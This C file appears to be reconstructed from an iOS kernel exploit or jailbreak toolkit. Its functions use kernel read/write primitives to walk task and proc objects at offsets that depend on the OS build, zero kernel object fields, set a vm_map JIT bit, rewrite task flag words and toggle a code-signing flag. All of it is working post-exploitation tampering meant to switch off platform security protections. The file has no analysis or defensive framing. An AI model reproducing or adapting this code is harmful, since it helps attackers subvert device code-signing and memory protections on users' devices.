/* record_0x90000_e9f89858_task_flags.c
 * sub_0a8dc..sub_0b49c — task/proc kobj field walkers, version-gated
 * offset resolvers, vm_page_mask alignment checks, task-flag setters,
 * and dyld/code-sign flag helpers.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_28dfc(long state, long addr, int val);
extern int  sub_295b4(long state, long addr, int *out);
extern int  sub_2a574(long state, long addr, int val);
extern long sub_1972c(long state, long addr);
extern long sub_049c8(long state, long h);
extern long sub_03e8c(void);
extern long sub_04680(void);
extern int  sub_06098(long state, uint32_t mask);
extern int  sub_130b4(long state, long addr, void *val, int sz);
extern long sub_2d934(void);

/* ── sub_0a8dc — pmap/task kobj field walker (PPL path) ─────────── */
long sub_0a8dc(long state, long h)
{
    if (!sub_06098(state, 0x20)) return 1;

    long kobj = sub_049c8(state, h);
    if (!kobj) return 0;

    long v = 0;
    if (!sub_28840(state, kobj + 0xb0, &v)) return 0;
    v = sub_1972c(state, v);
    if (!v) return 0;

    long v2 = 0;
    if (!sub_28840(state, v + 0x50, &v2)) return 0;
    if (!v2) return 1;

    long cached = *(long *)(state + 0x128);
    if (!cached || v2 == cached) return 1;

    /* read two pairs of 8-byte fields and pick the smaller */
    long a[2] = {0, 0}, b[2] = {0, 0};
    long base_a = 0, base_b = 0;
    if (!sub_2572c(state, cached + 0x28, 8, a)) return 0;
    if (!sub_2572c(state, cached + 0x30, 8, a + 1)) return 0;
    if (!sub_2572c(state, v2 + 0x28, 8, b)) return 0;
    if (!sub_2572c(state, v2 + 0x30, 8, b + 1)) return 0;

    if (a[0] < b[0]) { base_a = v2 + 0x28; }
    else             { base_a = v2 + 0x30; }

    return sub_130b4(state, base_a, a, 8) ? 1 : 0;
}

/* ── sub_0aa2c — version-gated proc/task kobj field zero ────────── */
long sub_0aa2c(long state, long h, int mode)
{
    if (!sub_2d934()) return 0;

    if (mode == 0) {
        if (sub_06098(state, 0x20)) goto ppl_path;
        if (!sub_06098(state, 0x5184001)) goto check_cap200;
        /* 0x5184001 set */
        {
            int build = *(int *)(state + 0x140);
            uint64_t ver = *(uint64_t *)(state + 0x158);
            long off;
            if (build < 0x2712) {
                if (build > 0x1f52) {
                    off = sub_06098(state, 0x1180000) ? 0x98 : 0xa0;
                } else if (build > 0x1c1a) {
                    off = sub_06098(state, 0x80000) ? 0xd8 : 0xe0;
                } else {
                    off = ver < 0x18090a07900000ULL ? 0xf0 : 0xe8;
                }
            } else {
                off = sub_06098(state, 0x1180000) ? 0xa0 : 0xa8;
            }
            long kobj = sub_049c8(state, h);
            if (!kobj) return 0;
            long v = 0;
            if (!sub_2572c(state, kobj + off, 8, &v)) return 0;
            if (!v) return 1;
            if (v & (uint64_t)vm_page_mask) return 0;
            long zero = 0;
            if (!sub_130b4(state, kobj + off, &zero, 8)) return 0;
            if (!sub_130b4(state, kobj + off + 8, &zero, 8)) return 0;
            return 1;
        }
check_cap200:
        if (!sub_06098(state, 0x200)) return 0;
        /* fall through to PPL path */
    }
ppl_path:
    return sub_0a8dc(state, h);
}

/* ── sub_0ad2c — set task vm_map JIT bit ────────────────────────── */
long sub_0ad2c(long state)
{
    long kobj = sub_03e8c();
    if (!kobj) return 0;

    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off;

    if (build < 0x1f54) {
        if (build == 0x1809)      off = 0x3c0;
        else if (build == 0x1c1b) off = 0x3a8;
        else if (build == 0x1f53) off = ver < 0x1f530f02800000ULL ? 0x430 : 0x4d0;
        else return 0;
    } else if (build < 0x225c) {
        if (build == 0x1f54)      off = 0x4c8;
        else if (build == 0x2258) off = 0x4ac;
        else return 0;
    } else {
        if (build == 0x225c || build == 0x2712) off = 0x6a4;
        else return 0;
    }

    int val = 0;
    if (!sub_295b4(state, off + kobj, &val)) return 0;
    if ((val & 0xff000000) != 0) return 0;

    uint32_t newval;
    if (ver < 0x1f530000000000ULL)
        newval = (uint32_t)val | 0x20u;
    else
        newval = ((uint32_t)val & 0xfff71fdfu) | 0x80000u;

    newval &= 0xffff1fffu;
    if ((uint32_t)val == newval) return 1;
    return sub_28dfc(state, off + kobj, (int)newval) ? 1 : 0;
}

/* ── sub_0ae94 — task flag byte setter (selector 0x4000001B) ────────
 * Stores three flag bytes into a task-local 32-bit word with
 * version-dependent bit layout.                                  */
long sub_0ae94(long state, long h, uint32_t port, uint8_t f4, uint8_t f5, uint8_t f6)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long kobj = sub_049c8(state, h);
    if (!kobj) return 0;

    int build = *(int *)(state + 0x140);
    long off;
    if (build < 0x2258) {
        if (build < 0x1f53) {
            if (build < 0x1c1b) {
                if (build < 0x1809) return 0;
                off = ver < 0x18090a07900000ULL ? 0xef : 0xe7;
            } else {
                off = sub_06098(state, 0x80000) ? 0xd8 : 0xe0;
            }
        } else {
            off = sub_06098(state, 0x1180000) ? 0x98 : 0xa0;
        }
    } else if (build < 0x2712) {
        off = sub_06098(state, 0x1180000) ? 0xa0 : 0xa8;
    } else {
        off = sub_06098(state, 0x1180000) ? 0xa0 : 0xa8;
    }

    int cur = 0;
    if (!sub_295b4(state, kobj + off, &cur)) return 0;

    uint32_t word;
    if (ver < 0x1c1b0a80100000ULL) {
        word = ((uint32_t)f4 << 8) | (uint32_t)f5 | ((uint32_t)f6 << 16);
    } else {
        word = ((uint32_t)f4 << 16) | (uint32_t)f5 | ((uint32_t)f6 << 24);
    }

    if ((uint32_t)cur == word) return 1;
    return sub_28dfc(state, kobj + off, (int)word) ? 1 : 0;
    (void)port;
}

/* ── sub_0b49c — dyld/code-sign flag bit set/clear ──────────────── */
long sub_0b49c(long state, long h, int set)
{
    long kobj = sub_04680();
    if (!kobj) return 0;

    int val = 0;
    if (!sub_295b4(state, kobj, &val)) return 0;

    uint32_t mask = 0x80u;
    uint32_t newval = set ? ((uint32_t)val | mask) : ((uint32_t)val & ~mask);
    if ((uint32_t)val == (newval & 0xffffff7fu)) return 1;
    return sub_2a574(state, kobj, (int)newval) ? 1 : 0;
    (void)h;
}
